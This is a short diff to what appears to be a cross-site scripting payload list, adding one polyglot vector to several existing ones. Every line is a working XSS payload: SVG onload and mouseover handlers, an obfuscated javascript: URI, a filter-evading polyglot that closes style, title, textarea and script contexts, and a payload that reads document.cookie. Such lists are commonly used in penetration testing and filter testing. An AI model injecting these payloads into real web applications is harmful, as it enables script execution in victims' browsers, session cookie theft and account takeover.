@@ -1,4 +1,5 @@
 <svg xmlns="http://w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
+ /*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e
 javascript:window['al'+'er'+(['t','b','c'][0])](origin)
 orwa%27"><svg/onload=alert(document.cookie)>
 ' oncontent\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\v+styl\u0065='content-visibility:auto
